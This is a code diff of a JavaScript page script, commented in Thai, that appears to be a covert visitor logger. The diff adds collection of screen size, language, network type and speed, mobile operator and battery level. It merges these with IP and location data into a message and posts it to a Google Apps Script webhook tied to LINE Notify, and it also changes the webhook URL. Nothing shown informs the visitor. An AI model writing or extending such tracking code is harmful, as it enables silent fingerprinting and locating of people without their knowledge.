@@ -13,17 +13,27 @@
 
   // เก็บข้อมูลอุปกรณ์แบบละเอียด
   const deviceInfo = getDetailedDeviceInfo();
+  const screenSize = `${window.screen.width}x${window.screen.height}`;
+  const screenColorDepth = window.screen.colorDepth;
+  const devicePixelRatio = window.devicePixelRatio || 1;
   const referrer = document.referrer || "ไม่มีข้อมูล";
+  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
   const platform = navigator.platform || "ไม่มีข้อมูล";
+  const connection = getConnectionInfo();
   const browser = detectBrowser();
 
   // ตรวจสอบการใช้งานแบตเตอรี่ (ถ้าใช้ได้)
   getBatteryInfo().then(batteryData => {
-    // รวบรวมข้อมูลทั้งหมดแล้วส่งไป (Removed screenSize, language, connection)
+    // รวบรวมข้อมูลทั้งหมดแล้วส่งไป
     const allDeviceData = {
       ...deviceInfo,
+      screenSize,
+      screenColorDepth,
+      devicePixelRatio,
+      language,
       platform,
       browser,
+      connection,
       battery: batteryData
     };
 
@@ -89,6 +99,84 @@ function getDetailedDeviceInfo() {
     deviceType: deviceType,
     deviceModel: deviceModel
   };
+}
+
+// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
+function getConnectionInfo() {
+  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+  let connectionInfo = {
+    type: "ไม่สามารถระบุได้",
+    effectiveType: "ไม่สามารถระบุได้",
+    downlink: "ไม่สามารถระบุได้",
+    rtt: "ไม่สามารถระบุได้",
+    saveData: false,
+    isWifi: false,
+    isMobile: false,
+    networkType: "ไม่สามารถระบุได้"
+  };
+
+  if (connection) {
+    // เก็บข้อมูลพื้นฐาน
+    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
+    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
+    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
+    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
+    connectionInfo.saveData = connection.saveData || false;
+
+    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
+    if (connection.type === 'wifi') {
+      connectionInfo.isWifi = true;
+      connectionInfo.networkType = "WiFi";
+    }
+    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
+      connectionInfo.isMobile = true;
+
+      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
+      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
+        connectionInfo.networkType = "2G";
+      } else if (connection.effectiveType === '3g') {
+        connectionInfo.networkType = "3G";
+      } else if (connection.effectiveType === '4g') {
+        connectionInfo.networkType = "4G/LTE";
+      } else if (connection.type === '5g') {
+        connectionInfo.networkType = "5G";
+      } else {
+        connectionInfo.networkType = "Mobile Data";
+      }
+    }
+    else {
+      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
+      if (connection.effectiveType === '4g') {
+        // ส่วนใหญ่ถ้า effectiveType เป็น 4g มักจะเป็น WiFi
+        connectionInfo.isWifi = true;
+        connectionInfo.networkType = "WiFi (น่าจะใช่)";
+      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
+        connectionInfo.isMobile = true;
+        connectionInfo.networkType = "Mobile Data";
+      }
+    }
+  }
+
+  return connectionInfo;
+}
+
+// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
+async function getBatteryInfo() {
+  try {
+    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      return {
+        level: Math.floor(battery.level * 100) + "%",
+        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
+      };
+    }
+
+    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
+  } catch (error) {
+    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
+  }
 }
 
 // ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
@@ -312,11 +400,35 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
   message.push(`📱 อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
   message.push(`🌐 เบราว์เซอร์: ${deviceData.browser}`);
 
-  // ข้อมูลหน้าจอ (Removed screenSize) - Keep color depth and pixel ratio for now
-  message.push(`📊 หน้าจอ: (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);
+  // ข้อมูลหน้าจอ
+  message.push(`📊 ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);
 
-  // ข้อมูลระบบ (Removed language)
+  // ข้อมูลระบบ
   message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
+  message.push(`🔤ภาษา: ${deviceData.language}`);
+
+  // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
+  if (typeof deviceData.connection === 'object') {
+    // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
+    const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
+    const networkType = deviceData.connection.networkType;
+    message.push(`${networkTypeIcon}การเชื่อมต่อ: ${networkType} (${deviceData.connection.effectiveType})`);
+    message.push(`⚡ความเร็วโดยประมาณ: ${deviceData.connection.downlink} Mbps (RTT: ${deviceData.connection.rtt}ms)`);
+
+    // ถ้าเป็น Mobile ให้แสดงข้อมูลเพิ่มเติม
+    if (deviceData.connection.isMobile && phoneInfo) {
+      message.push(`📞เครือข่ายมือถือ: ${phoneInfo.possibleOperator}`);
+      if (phoneInfo.countryCode !== "ไม่สามารถระบุได้") {
+        message.push(`🏴รหัสประเทศ: ${phoneInfo.countryCode}`);
+      }
+      message.push(`📝หมายเหตุ: ${phoneInfo.remarks}`);
+    }
+  }
+
+  // ข้อมูลแบตเตอรี่
+  if (typeof deviceData.battery === 'object') {
+    message.push(`🔋แบตเตอรี่: ${deviceData.battery.level} (${deviceData.battery.charging})`);
+  }
 
   return message.join("\n");
 }
@@ -327,7 +439,7 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
   const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo);
 
   // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxMA8Eb_FoWtCogWqP4qjpQJgdws9II4YSLo8nVqJP7hEKRSSJJPEgVWI4WhoSh9CR2Sg/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwXkflttKr0oJAajqxO9Xhx8qIgBBQfHN_REF9mXaVFASJpaoHzHAB2f_AO86Sxh0iMeA/exec';
 
   // เตรียมข้อมูลสำหรับส่ง
   const dataToSend = {
